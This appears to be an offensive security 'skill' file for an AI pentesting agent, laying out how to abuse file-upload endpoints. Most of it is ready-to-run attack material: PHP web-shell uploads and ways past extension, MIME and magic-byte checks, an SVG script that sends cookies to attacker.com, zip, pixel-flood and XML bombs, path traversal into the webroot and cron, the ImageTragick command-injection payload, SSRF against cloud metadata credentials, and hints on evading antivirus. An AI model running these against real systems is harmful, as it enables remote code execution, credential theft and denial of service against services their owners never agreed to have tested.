---
name: file_upload_abuse
description: File upload vulnerabilities covering unrestricted upload, polyglot files, zip bombs, decompression bombs, SVG XSS, imageTragick, path traversal via filename, and DoS via infinite processing
---

# File Upload Abuse

File upload endpoints are high-value targets. Vulnerabilities range from RCE via web shells to DoS via resource exhaustion. Modern attacks target parsers, image processors, archive handlers, and antivirus scanners.

## Attack Surface

**Upload Endpoints**
- Profile picture/avatar upload
- Document/attachment upload
- Import/CSV/XML upload
- Logo/branding upload
- Resume/CV upload
- Any multipart/form-data endpoint

**Processing Pipelines**
- Image resizing/conversion (ImageMagick, Pillow, Sharp, GD)
- PDF generation/parsing
- Archive extraction (zip, tar, gzip, rar, 7z)
- Document parsing (docx, xlsx, pptx)
- Antivirus scanning (ClamAV, custom scanners)
- Thumbnail generation
- OCR processing
- Video/audio transcoding

**Storage Backends**
- Local filesystem
- S3/GCS/Azure Blob
- CDN with origin pull
- Database BLOB storage

## Detection Channels

**Static Analysis**
- Search for file upload handlers: `multer`, `busboy`, `formidable`, `express-fileupload`
- Check MIME type validation (client-side only? server-side?)
- Check file extension allowlist/blocklist
- Check file size limits
- Check if uploaded files are served from same domain
- Check if filenames are sanitized

**Dynamic Analysis**
- Upload various file types and observe processing behavior
- Test with oversized files → measure response time and resource usage
- Test with malformed files → observe error messages
- Test with polyglot files → check if executed
- Test with archive bombs → check if extraction is bounded

## Exploitation Techniques

### Unrestricted File Upload → RCE

**Web Shell Upload**
```bash
# PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -F "file=@shell.php" https://target.com/upload

# If .php blocked, try alternatives:
# .phtml, .pht, .php3, .php4, .php5, .php7, .phps, .phar
# .shtml, .cgi, .pl, .py, .jsp, .jspx, .asp, .aspx

# Double extension bypass
mv shell.php shell.php.jpg  # Apache with mod_mime
mv shell.php shell.jpg.php  # some configs

# Null byte injection (older PHP < 5.3.4)
mv shell.php "shell.php%00.jpg"
```

**Content-Type Bypass**
```bash
# Server checks Content-Type header only
curl -F "file=@shell.php;type=image/jpeg" https://target.com/upload

# Or modify Content-Type in multipart boundary
# Content-Type: image/jpeg (but actual file is PHP)
```

**Magic Bytes Bypass**
```bash
# Prepend valid image magic bytes to PHP shell
printf '\xff\xd8\xff\xe0' > shell.jpg.php  # JPEG magic
cat shell.php >> shell.jpg.php

# GIF magic
printf 'GIF89a' > shell.gif.php
cat shell.php >> shell.gif.php

# PNG magic
printf '\x89PNG\r\n\x1a\n' > shell.png.php
cat shell.php >> shell.png.php
```

### Polyglot Files

**Image + PHP Polyglot**
```bash
# Create valid JPEG that also contains PHP
# Use exiftool to inject PHP into EXIF comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg -o polyglot.jpg.php

# Or append PHP after valid image data
cat legit.jpg > polyglot.jpg
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.jpg
```

**PDF + JavaScript Polyglot**
```bash
# PDF with embedded JavaScript (executes in some PDF readers)
# Create PDF with /OpenAction containing JS
```

**SVG + XSS Polyglot**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script type="text/javascript">
    alert(document.cookie);
    fetch('https://attacker.com/?c=' + document.cookie);
  </script>
  <rect width="100" height="100" fill="red"/>
</svg>
```

### DoS via Resource Exhaustion

**Zip Bomb (Decompression Bomb)**
```bash
# Create a zip bomb: small file that expands to massive size
# 42.zip: 42KB → 4.5PB (petabytes)
wget https://www.bamsoftware.com/hacks/zipbomb/42.zip

# Or create your own:
# Create deeply nested zip (zip within zip within zip)
python3 -c "
import zipfile, io
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('data.txt', 'A' * 10_000_000)
with open('bomb.zip', 'wb') as f:
    f.write(buf.getvalue())
"

# Upload and observe server behavior
curl -F "file=@bomb.zip" https://target.com/upload
```

**Image Dimension Bomb**
```bash
# Create image with extreme dimensions (e.g., 100000x100000 pixels)
# Small file size but massive memory allocation when processed
python3 -c "
from PIL import Image
img = Image.new('RGB', (100000, 100000), color='red')
img.save('dimension_bomb.png')
"

# Or use ImageMagick
convert -size 100000x100000 xc:red dimension_bomb.png
```

**SVG Billion Laughs (XML Bomb)**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY a "AAAAAAAAAA">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
  <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
  <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
  <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
  <!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&i;</text>
</svg>
```

**Infinite Loop via Recursive Archives**
```bash
# Create zip that references itself (quine)
# Some extractors enter infinite loop

# Or create symlink loop inside archive
ln -s /dev/zero infinite_file
zip -y loop.zip infinite_file
rm infinite_file

# Upload and observe if server hangs
```

**Pixel Flood (JPEG)**
```bash
# Modify JPEG dimensions in header to claim massive size
# Actual data is small but parser allocates based on header
python3 -c "
import struct
# Read valid JPEG, modify SOF0 marker dimensions
with open('legit.jpg', 'rb') as f:
    data = bytearray(f.read())

# Find SOF0 marker (0xFFC0) and modify width/height
for i in range(len(data)):
    if data[i:i+2] == b'\xff\xc0':
        # Set height to 65535, width to 65535
        struct.pack_into('>HH', data, i+5, 65535, 65535)
        break

with open('pixel_flood.jpg', 'wb') as f:
    f.write(data)
"
```

### Path Traversal via Filename

```bash
# Upload file with path traversal in filename
curl -F "file=@shell.php;filename=../../../var/www/html/shell.php" https://target.com/upload

# URL-encoded
curl -F "file=@shell.php;filename=..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php" https://target.com/upload

# Double-encoded
curl -F "file=@shell.php;filename=..%252F..%252F..%252Fvar%252Fwww%252Fhtml%252Fshell.php" https://target.com/upload

# Null byte (older systems)
curl -F "file=@shell.php;filename=../../../etc/cron.d/evil%00.jpg" https://target.com/upload
```

### ImageTragick (CVE-2016-3714)

```bash
# ImageMagick RCE via crafted image file
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id > /tmp/pwned")'
pop graphic-context
EOF

# Upload as image (rename to .jpg or .png)
mv exploit.mvg exploit.jpg
curl -F "file=@exploit.jpg" https://target.com/upload

# Alternative vectors:
# .svg with external entity
# .eps with PostScript commands
# .pdf with embedded commands
```

### SSRF via File Upload

```bash
# Upload file containing URL reference that server fetches
# SVG with external reference
cat > ssrf.svg << 'EOF'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="100" height="100"/>
</svg>
EOF

curl -F "file=@ssrf.svg" https://target.com/upload

# PDF with external reference
# HTML file with <img src="http://169.254.169.254/...">
# Office document with external links
```

### Antivirus Evasion

```bash
# Upload EICAR test file to check if AV scanning exists
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.txt
curl -F "file=@eicar.txt" https://target.com/upload

# If rejected → AV scanning is active
# If accepted → no AV scanning

# Bypass AV with encoding/obfuscation
# Base64 encode, XOR, pack with UPX
```

## Bypass Techniques

**Extension Bypass**
| Blocked | Try Instead |
|---------|-------------|
| `.php` | `.phtml`, `.pht`, `.php3`, `.php4`, `.php5`, `.php7`, `.phps`, `.phar` |
| `.jsp` | `.jspx`, `.jspa`, `.jspf` |
| `.asp` | `.aspx`, `.asa`, `.cer`, `.cdx` |
| `.exe` | `.scr`, `.com`, `.bat`, `.cmd` |
| `.js` | `.mjs`, `.cjs` |
| `.html` | `.htm`, `.shtml`, `.xhtml` |
| All blocked | Double extension: `file.php.jpg`, null byte: `file.php%00.jpg` |

**MIME Type Bypass**
- Change `Content-Type` header to allowed type
- Embed valid magic bytes at start of file
- Use polyglot files (valid image + executable code)

**Size Limit Bypass**
- Compress payload before upload
- Split across multiple uploads
- Upload in chunks if API supports it

**Filename Sanitization Bypass**
- Unicode normalization: `..%c0%af` (overlong UTF-8)
- Case variations: `..%2f` vs `..%2F`
- Double encoding: `..%252f`
- Backslash on Windows: `..\\..\\`
- Mixed separators: `../..\\`

## Validation

**Confirm RCE**
- Upload web shell, access it via browser
- Execute `id` or `whoami` command
- Create marker file: `touch /tmp/pwned`

**Confirm XSS via SVG**
- Upload SVG with `<script>alert(1)</script>`
- Access uploaded file URL in browser
- Check if script executes

**Confirm DoS**
- Upload zip bomb, measure response time
- Upload pixel flood image, check if server crashes/hangs
- Upload SVG billion laughs, check if XML parser hangs
- Monitor server CPU/memory if possible

**Confirm Path Traversal**
- Upload file with `../../../tmp/test.txt` as filename
- Check if file appears at `/tmp/test.txt` on server
- Try reading `/etc/passwd` via traversal

**Confirm SSRF**
- Upload SVG referencing `http://169.254.169.254/latest/meta-data/`
- Check if server fetches the URL (observe via OOB channel (interactsh-client))
- Look for AWS metadata in response or error messages

**Avoid False Positives**
- File uploaded ≠ RCE (must be executable on server)
- SVG uploaded ≠ XSS (must be served with correct Content-Type and accessed in browser)
- Slow response ≠ DoS (could be legitimate processing)
- Error message ≠ vulnerability (could be expected validation)

## Impact

- **Remote Code Execution**: Web shell upload → full server compromise
- **Cross-Site Scripting**: SVG/HTML upload → stored XSS
- **Denial of Service**: Zip bomb, pixel flood, billion laughs → server crash
- **Server-Side Request Forgery**: SVG/PDF with external references → internal network access
- **Path Traversal**: Filename manipulation → arbitrary file write/read
- **Information Disclosure**: ImageTragick → command output, file read
- **Antivirus Evasion**: Upload malware without detection

## Pro Tips

1. **Always test with EICAR first** - determines if AV scanning exists
2. **Test all upload endpoints** - profile pic, documents, imports, logos
3. **Check file serving location** - same domain = XSS risk, different domain = safer
4. **Test processing pipeline** - image resize, PDF generation, archive extraction
5. **Upload polyglot files** - valid image + executable code
6. **Test with extreme dimensions** - 100000x100000 pixel images
7. **Test with archive bombs** - small zip that expands to GB/TB
8. **Test SVG with JavaScript** - many apps don't sanitize SVG content
9. **Check filename handling** - path traversal, null bytes, double extensions
10. **Test SSRF via file content** - SVG/PDF/Office docs with external references
11. **Use curl/httpx/Python scripts for testing
12. **Check for race conditions** - upload + access before validation completes
